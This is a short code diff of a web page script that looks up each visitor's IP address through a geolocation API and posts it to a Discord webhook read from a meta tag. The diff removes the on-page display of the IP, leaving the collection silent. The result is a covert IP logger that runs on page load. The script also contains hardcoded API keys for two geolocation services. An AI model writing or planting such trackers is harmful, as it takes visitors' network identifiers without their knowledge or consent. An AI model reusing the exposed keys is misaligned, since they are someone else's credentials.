@@ -15,18 +15,16 @@
 
   <script>
     // use the 'fetch' API to retrieve the user's IP address
-    fetch('https://geo.ipify.org/api/v2/country?apiKey=at_yHdpwi6YfyPOkdzkVnb7Y7T08y0KD')
-      .then(response => response.json())
-      .then(data => {
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
         // display the IP address on the page
-        document.getElementById('ip').innerHTML = data.ip;
+        const ip = data.ip
 
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
 
         // send the IP address to the Discord webhook
         axios.post(webhookUrl, {
-          content: `IP address: ${data.ip}`
+          content: `IP address: ${ip}`
         });
       });
   </script>
